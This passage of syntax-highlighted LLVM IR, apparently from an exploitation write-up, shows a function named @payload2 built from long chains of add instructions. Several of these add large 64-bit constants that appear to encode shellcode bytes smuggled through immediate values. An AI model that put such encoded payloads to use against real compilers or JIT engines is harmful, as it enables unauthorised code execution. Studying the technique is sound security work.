class="number">290</span> = add nsw i64 %<span class="number">289</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">291</span> = add nsw i64 %<span class="number">290</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">292</span> = add nsw i64 %<span class="number">291</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">293</span> = add nsw i64 %<span class="number">292</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">294</span> = add nsw i64 %<span class="number">293</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">295</span> = add nsw i64 %<span class="number">294</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">296</span> = add nsw i64 %<span class="number">295</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">297</span> = add nsw i64 %<span class="number">296</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">298</span> = add nsw i64 %<span class="number">297</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">299</span> = add nsw i64 %<span class="number">298</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">300</span> = add nsw i64 %<span class="number">299</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">301</span> = add nsw i64 %<span class="number">300</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">302</span> = add nsw i64 %<span class="number">301</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">303</span> = add nsw i64 %<span class="number">302</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">304</span> = add nsw i64 %<span class="number">303</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">305</span> = add nsw i64 %<span class="number">304</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">306</span> = add nsw i64 %<span class="number">305</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">307</span> = add nsw i64 %<span class="number">306</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">308</span> = add nsw i64 %<span class="number">307</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">309</span> = add nsw i64 %<span class="number">308</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">310</span> = add nsw i64 %<span class="number">309</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">311</span> = add nsw i64 %<span class="number">310</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">312</span> = add nsw i64 %<span class="number">311</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">313</span> = add nsw i64 %<span class="number">312</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">314</span> = add nsw i64 %<span class="number">313</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">315</span> = add nsw i64 %<span class="number">314</span>, <span class="number">1024</span></span><br><span class="line">  ret i64 %<span class="number">315</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @payload2(i64 %<span class="number">0</span>) #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">2</span> = add nsw i64 %<span class="number">0</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">3</span> = add nsw i64 %<span class="number">2</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">4</span> = add nsw i64 %<span class="number">3</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">5</span> = add nsw i64 %<span class="number">4</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">6</span> = add nsw i64 %<span class="number">5</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">7</span> = add nsw i64 %<span class="number">6</span>, <span class="number">16999839996723556031</span></span><br><span class="line">  %<span class="number">8</span> = add nsw i64 %<span class="number">7</span>, <span class="number">16999840167007600968</span></span><br><span class="line">  %<span class="number">9</span> = add nsw i64 %<span class="number">8</span>, <span class="number">16999839549882511291</span></span><br><span class="line">  %<span class="number">10</span> = add nsw i64 %<span class="number">9</span>, <span class="number">16999840169020293448</span></span><br><span class="line">  %<span class="number">11</span> = add nsw i64 %<span class="number">10</span>, <span class="number">16999840169015152727</span></span><br><span class="line">  %<span class="number">12</span> = add nsw i64 %<span class="number">11</span>, <span class="number">16999840169015152724</span></span><br><span class="line">  %<span class="number">13</span> = add nsw i64 %<span class="number">12</span>, <span class="number">16999840169015152735</span></span><br><span class="line">  %<span class="number">14</span> = add nsw i64 %<span class="number">13</span>, <span class="number">16999840169021813064</span></span><br><span class="line">  %<span class="number">15</span> = add nsw i64 %<span class="number">14</span>, <span class="number">16999840169019453768</span></span><br><span class="line">  %<span class="number">16</span> = add nsw i64 %<span class="number">15</span>, <span class="number">16999840169015130986</span></span><br><span class="line">  %<span class="number">17</span> = add nsw i64 %<span class="number">16</span>, <span class="number">16999840169015152728</span></span><br><span class="line">  %<span class="number">18</span> = add nsw i64 %<span class="number">17</span>, <span class="number">16999840169015117071</span></span><br><span class="line">  %<span class="number">19</span> = add nsw i64 %<span class="number">18</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">20</span> = add nsw i64 %<span class="number">19</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">21</span> = add nsw i64 %<span class="number">20</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">22</span> = add nsw i64 %<span class="number">21</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">23</span> = add nsw i64 %<span class="number">22</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">24</span> = add nsw i64 %<span class="number">23</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">25</span> = add nsw i64 %<span class="number">24</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">26</span> = add nsw i64 %<span class="number">25</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">27</span> = add nsw i64 %<span class="number">26</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">28</span> = add nsw i64 %<span class="number">27</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">29</span> = add nsw i64 %<span class="number">28</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">30</span> = add nsw i64 %<span class="number">29</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">31</span> = add nsw i64 %<span class="number">30</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">32</span> = add nsw i64 %<span class="number">31</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">33</span> = add nsw i64 %<span class="number">32</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">34</span> = add nsw i64 %<span class="number">33</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">35</span> = add nsw i64 %<span class="number">34</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">36</span> = add nsw i64 %<span class="number">35</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">37</span> = add nsw i64 %<span class="number">36</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">38</span> = add nsw i64 %<span class="number">37</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">39</span> = add nsw i64 %<span class="number">38</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">40</span> = add nsw i64 %<span class="number">39</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">41</span> = add nsw i64 %<span class="number">40</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">42</span> = add nsw i64 %<span class="number">41</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">43</span> = add nsw i64 %<span class="number">42</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">44</span> = add nsw i64 %<span class="number">43</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">45</span> = add nsw i64 %<span class="number">44</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">46</span> = add nsw i64 %<span class="number">45</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">47</span> = add nsw i64 %<span class="number">46</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">48</span> = add nsw i64 %<span class="number">47</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">49</span> = add nsw i64 %<span class="number">48</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">50</span> = add nsw i64 %<span class="number">49</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">51</span> = add nsw i64 %<span class="number">50</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">52</span> = add nsw i64 %<span class="number">51</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">53</span> = add nsw i64 %<span class="number">52</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">54</span> = add nsw i64 %<span class="number">53</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">55</span> = add nsw i64 %<span class="number">54</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">56</span> = add nsw i64 %<span class="number">55</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">57</span> = add nsw i64 %<span class="number">56</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">58</span> = add nsw i64 %<span class="number">57</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">59</span> = add nsw i64 %<span class="number">58</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">60</span> = add nsw i64 %<span class="number">59</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">61</span> = add nsw i64 %<span class="number">60</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">62</span> = add nsw i64 %<span class="number">61</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">63</span> = add nsw i64 %<span class="number">62</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">64</span> = add nsw i64 %<span class="number">63</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">65</span> = add nsw i64 %<span class="number">64</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">66</span> = add nsw i64 %<span class="number">65</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">67</span> = add nsw i64 %<span class="number">66</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">68</span> = add nsw i64 %<span class="number">67</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">69</span> = add nsw i64 %<span class="number">68</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">70</span> = add nsw i64 %<span class="number">69</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">71</span> = add nsw i64 %<span class="number">70</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">72</span> = add nsw i64 %<span class="number">71</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">73</span> = add nsw i64 %<span class="number">72</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">74</span> = add nsw i64 %<span class="number">73</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">75</span> = add nsw i64 %<span class="number">74</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">76</span> = add nsw i64 %<span class="number">75</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">77</span> = add nsw i64 %<span class="number">76</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">78</span> = add nsw i64 %<span class="number">77</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">79</span> = add nsw i64 %<span class="number">78</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">80</span> = add nsw i64 %<span class="number">79</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">81</span> = add nsw i64 %<span class="number">80</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">82</span> = add nsw i64 %<span class="number">81</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">83</span> = add nsw i64 %<span class="number">82</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">84</span> = add nsw i64 %<span class="number">83</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">85</span> = add nsw i64 %<span class="number">84</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">86</span> = add nsw i64 %<span class="number">85</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">87</span> = add nsw i64 %<span class="number">86</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">88</span> = add nsw i64 %<span class="number">87</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">89</span> = add nsw i64 %<span class="number">88</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">90</span> = add nsw i64 %<span class="number">89</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">91</span> = add nsw i64 %<span class="number">90</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">92</span> = add nsw i64 %<span class="number">91</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">93</span> = add nsw i64 %<span class="number">92</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">94</span> = add nsw i64 %<span class="number">93</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">95</span> = add nsw i64 %<span class="number">94</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">96</span> = add nsw i64 %<span class="number">95</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">97</span> = add nsw i64 %<span class="number">96</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">98</span> = add nsw i64 %<span class="number">97</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">99</span> = add nsw i64 %<span class="number">98</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">100</span> = add nsw i64 %<span class="number">99</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">101</span> = add nsw i64 %<span class="number">100</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">102</span> = add nsw i64 %<span class="number">101</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">103</span> = add nsw i64 %<span class="number">102</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">104</span> = add nsw i64 %<span class="number">103</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">105</span> = add nsw i64 %<span class="number">104</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">106</span> = add nsw i64 %<span class="number">105</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">107</span> = add nsw i64 %<span class="number">106</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">108</span> = add nsw i64 %<span class="number">107</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">109</span> = add nsw i64 %<span class="number">108</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">110</span> = add nsw i64 %<span class="number">109</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">111</span> = add nsw i64 %<span class="number">110</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">112</span> = add nsw i64 %<span class="number">111</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">113</span> = add nsw i64 %<span class="number">112</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">114</span> = add nsw i64 %<span class="number">113</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">115</span> = add nsw i64 %<span class="number">114</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">116</span> = add nsw i64 %<span class="number">115</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">117</span> = add nsw i64 %<span class="number">116</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">118</span> = add nsw i64 %<span class="number">117</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">119</span> = add nsw i64 %<span class="number">118</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">120</span> = add nsw i64 %<span class="number">119</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">121</span> = add nsw i64 %<span class="number">120</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">122</span> = add nsw i64 %<span class="number">121</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">123</span> = add nsw i64 %<span class="number">122</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">124</span> = add nsw i64 %<span class="number">123</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">125</span> = add nsw i64 %<span class="number">124</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">126</span> = add nsw i64 %<span class="number">125</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">127</span> = add nsw i64 %<span class="number">126</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">128</span> = add nsw i64 %<span class="number">127</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">129</span> = add nsw i64 %<span class="number">128</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">130</span> = add nsw i64 %<span class="number">129</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">131</span> = add nsw i64 %<span class="number">130</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">132</span> = add nsw i64 %<span class="number">131</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">133</span> = add nsw i64 %<span class="number">132</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">134</span> = add nsw i64 %<span class="number">133</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">135</span> = add nsw i64 %<span class="number">134</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">136</span> = add nsw i64 %<span class="number">135</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">137</span> = add nsw i64 %<span class="number">136</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">138</span> = add nsw i64 %<span class="number">137</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">139</span> = add nsw i64 %<span class="number">138</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">140</span> = add nsw i64 %<span class="number">139</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">141</span> = add nsw i64 %<span class="number">140</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">142</span> = add nsw i64 %<span class="number">141</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">143</span> = add nsw i64 %<span class="number">142</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">144</span> = add nsw i64 %<span class="number">143</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">145</span> = add nsw i64 %<span class="number">144</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">146</span> = add nsw i64 %<span class="number">145</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">147</span> = add nsw i64 %<span class="number">146</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">148</span> = add nsw i64 %<span class="number">147</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">149</span> = add nsw i64 %<span class="number">148</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">150</span> = add nsw i64 %<span class="number">149</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">151</span> = add nsw i64 %<span class="number">150</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">152</span> = add nsw i64 %<span class="number">151</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">153</span> = add nsw i64 %<span class="number">152</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">154</span> = add nsw i64 %<span class="number">153</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">155</span> = add nsw i64 %<span class="number">154</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">156</span> = add nsw i64 %<span class="number">155</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">157</span> = add nsw i64 %<span class="number">156</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">158</span> = add nsw i64 %<span class="number">157</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">159</span> = add nsw i64 %<span class="number">158</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">160</span> = add nsw i64 %<span class="number">159</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">161</span> = add nsw i64 %<span class="number">160</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">162</span> = add nsw i64 %<span class="number">161</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">163</span> = add nsw i64 %<span class="number">162</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">164</span> = add nsw i64 %<span class="number">163</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">165</span> = add nsw i64 %<span class="number">164</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">166</span> = add nsw i64 %<span class="number">165</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">167</span> = add nsw i64 %<span class="number">166</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">168</span> = add nsw i64 %<span class="number">167</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">169</span> = add nsw i64 %<span class="number">168</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">170</span> = add nsw i64 %<span class="number">169</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">171</span> = add nsw i64 %<span class="number">170</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">172</span> = add nsw i64 %<span class="number">171</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">173</span> = add nsw i64 %<span class="number">172</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">174</span> = add nsw i64 %<span class="number">173</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">175</span> = add nsw i64 %<span class="number">174</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">176</span> = add nsw i64 %<span class="number">175</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">177</span> = add nsw i64 %<span class="number">176</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">178</span> = add nsw i64 %<span class="number">177</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">179</span> = add nsw i64 %<span class="number">178</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">180</span> = add nsw i64 %<span class="number">179</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">181</span> = add nsw i64 %<span class="number">180</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">182</span> = add nsw i64 %<span class="number">181</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">183</span> = add nsw i64 %<span class="number">182</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">184</span> = add nsw i64 %<span class="number">183</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">185</span> = add nsw i64 %<span class="number">184</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">186</span> = add nsw i64 %<span class="number">185</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">187</span> = add nsw i64 %<span class="number">186</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">188</span> = add nsw i64 %<span class="number">187</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">189</span> = add nsw i64 %<span class="number">188</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">190</span> = add nsw i64 %<span class="number">189</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">191</span> = add nsw i64 %<span class="number">190</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">192</span> = add nsw i64 %<span class="number">191</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">193</span> = add nsw i64 %<span class="number">192</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">194</span> = add nsw i64 %<span class="number">193</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">195</span> = add nsw i64 %<span class="number">194</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">196</span> = add nsw i64 %<span class="number">195</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">197</span> = add nsw i64 %<span class="number">196</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">198</span> = add nsw i64 %<span class="number">197</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">199</span> = add nsw i64 %<span class="number">198</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">200</span> = add nsw i64 %<span class="number">199</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">201</span> = add nsw i64 %<span class="number">200</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">202</span> = add nsw i64 %<span class="number">201</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">203</span> = add nsw i64 %<span class="number">202</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">204</span> = add nsw i64 %<span class="number">203</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">205</span> = add nsw i64 %<span class="number">204</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">206</span> = add nsw i64 %<span class="number">205</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">207</span> = add nsw i64 %<span class="number">206</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">208</span> = add nsw i64 %<span class="number">207</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">209</span> = add nsw i64 %<span class="number">208</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">210</span> = add nsw i64 %<span class="number">209</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">211</span> = add nsw i64 %<span class="number">210</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">212</span> = add nsw i64 %<span class="number">211</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">213</span> = add nsw i64 %<span class="number">212</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">214</span> = add nsw i64 %<span class="number">213</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">215</span> = add nsw i64 %<span class="number">214</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">216</span> = add nsw i64 %<span class="number">215</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">217</span> = add nsw i64 %<span class="number">216</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">218</span> = add nsw i64 %<span class="number">217</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">219</span> = add nsw i64 %<span class="number">218</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">220</span> = add nsw i64 %<span class="number">219</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">221</span> = add nsw i64 %<span class="number">220</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">222</span> = add nsw i64 %<span class="number">221</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">223</span> = add nsw i64 %<span class="number">222</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">224</span> = add nsw i64 %<span class="number">223</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">225</span> = add nsw i64 %<span class="number">224</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">226</span> = add nsw i64 %<span class="number">225</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">227</span> = add nsw i64 %<span class="number">226</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">228</span> = add nsw i64 %<span class="number">227</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">229</span> = add nsw i64 %<span class="number">228</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">230</span> = add nsw i64 %<span class="number">229</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">231</span> = add nsw i64 %<span class="number">230</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">232</span> = add nsw i64 %<span class="number">231</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">233</span> = add nsw i64 %<span class="number">232</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">234</span> = add nsw i64 %<span class="number">233</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">235</span> = add nsw i64 %<span class="number">234</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">236</span> = add nsw i64 %<span class="number">235</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">237</span> = add nsw i64 %<span class="number">236</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">238</span> = add nsw i64 %<span class="number">237</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">239</span> = add nsw i64 %<span class="number">238</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">240</span> = add nsw i64 %<span class="number">239</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">241</span> = add nsw i64 %<span class="number">240</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">242</span> = add nsw i64 %<span class="number">241</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">243</span> = add nsw i64 %<span class="number">242</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">244</span> = add nsw i64 %<span class="number">243</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">245</span> = add nsw i64 %<span class="number">244</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">246</span> = add nsw i64 %<span class="number">245</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">247</span> = add nsw i64 %<span class="number">246</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">248</span> = add nsw i64 %<span class="number">247</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">249</span> = add nsw i64 %<span class="number">248</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">250</span> = add nsw i64 %<span class="number">249</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">251</span> = add nsw i64 %<span class="number">250</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">252</span> = add nsw i64 %<span class="number">251</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">253</span> = add nsw i64 %<span class="number">252</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">254</span> = add nsw i64 %<span class="number">253</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">255</span> = add nsw i64 %<span class="number">254</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">256</span> = add nsw i64 %<span class="number">255</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">257</span> = add nsw i64 %<span class="number">256</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">258</span> = add nsw i64 %<span class="number">257</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">259</span> = add nsw i64 %<span class="number">258</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">260</span> = add nsw i64 %<span class="number">259</span>, <span 